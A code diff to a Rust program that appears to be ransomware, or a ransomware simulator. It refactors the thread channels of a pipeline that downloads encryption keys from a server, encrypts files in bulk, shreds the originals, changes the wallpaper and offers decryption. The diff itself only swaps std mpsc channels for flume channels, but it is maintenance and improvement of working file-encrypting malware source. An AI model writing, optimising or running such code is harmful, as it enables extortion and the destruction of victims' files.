@@ -12,7 +12,8 @@ use hex::encode;
 use log::{debug, error, info, warn};
 use std::{
     path::{Path, PathBuf},
-    sync::{Arc, Mutex, mpsc},
+    process::exit,
+    sync::{Arc, mpsc},
     thread,
 };
 use zeroize::{Zeroize, Zeroizing};
@@ -43,7 +44,7 @@ mod shredder;
 use shredder::shred;
 
 mod client;
-use client::{ThreadCounts, get_thread_counts, initialize_client};
+use client::{ThreadCounts, channel_capacity, get_thread_counts, initialize_client};
 
 mod img;
 use img::set_icon_wallpaper;
@@ -184,7 +185,7 @@ fn setup_encryption_keys(
             config::VERIFY_SERVER,
         ) else {
             error!("Unable to retrieve symmetric key from server; exiting");
-            std::process::exit(1);
+            exit(1);
         };
         *sym_key = *key;
     } else {
@@ -198,7 +199,7 @@ fn setup_encryption_keys(
             config::VERIFY_SERVER,
         ) else {
             error!("Unable to download asymmetric public key from server; exiting");
-            std::process::exit(1);
+            exit(1);
         };
         debug!("Got asymmetric public key: {asym_pub_key:?}");
 
@@ -274,9 +275,8 @@ fn run_encryption_pipeline(
     export_status_csv(exe_path_dir.as_ref(), status);
     debug!("Updated status CSV");
 
-    let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
-    let (channel_a_sender, channel_a_receiver) = mpsc::sync_channel(cap(thread_counts.encrypt));
-    let channel_a_receiver = Arc::new(Mutex::new(channel_a_receiver));
+    let (channel_a_sender, channel_a_receiver) =
+        flume::bounded(channel_capacity(thread_counts.encrypt));
     let mut thread_handles = Vec::new();
 
     if config::RANDOM_ORDER {
@@ -311,8 +311,8 @@ fn run_encryption_pipeline(
     if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
         debug!("Canary mode enabled");
 
-        let (channel_b_sender, channel_b_receiver) = mpsc::sync_channel(cap(thread_counts.encrypt));
-        let channel_b_receiver = Arc::new(Mutex::new(channel_b_receiver));
+        let (channel_b_sender, channel_b_receiver) =
+            flume::bounded(channel_capacity(thread_counts.encrypt));
 
         for _ in 0..thread_counts.canary {
             thread_handles.push(filter_canary(
@@ -333,8 +333,7 @@ fn run_encryption_pipeline(
             drop(channel_b_receiver);
         } else {
             let (channel_c_sender, channel_c_receiver) =
-                mpsc::sync_channel(cap(thread_counts.shred));
-            let channel_c_receiver = Arc::new(Mutex::new(channel_c_receiver));
+                flume::bounded(channel_capacity(thread_counts.shred));
             for _ in 0..thread_counts.encrypt {
                 thread_handles.push(encrypt(
                     channel_b_receiver.clone(),
@@ -356,8 +355,8 @@ fn run_encryption_pipeline(
         thread_handles.push(record(channel_a_receiver.clone(), Arc::clone(exe_path_dir)));
         drop(channel_a_receiver);
     } else {
-        let (channel_c_sender, channel_c_receiver) = mpsc::sync_channel(cap(thread_counts.shred));
-        let channel_c_receiver = Arc::new(Mutex::new(channel_c_receiver));
+        let (channel_c_sender, channel_c_receiver) =
+            flume::bounded(channel_capacity(thread_counts.shred));
         for _ in 0..thread_counts.encrypt {
             thread_handles.push(encrypt(
                 channel_a_receiver.clone(),
@@ -513,8 +512,7 @@ fn decrypt_files(
     decrypt_threads: usize,
     aad: &Arc<[u8]>,
 ) {
-    let (s3, r3) = mpsc::sync_channel(std::cmp::max(decrypt_threads * 2, 64));
-    let r3 = Arc::new(Mutex::new(r3));
+    let (s3, r3) = flume::bounded(channel_capacity(decrypt_threads));
     let mut thread_handles = Vec::new();
 
     debug!("Spawning walk coordinator for decryption with {walk_threads} zlob workers");
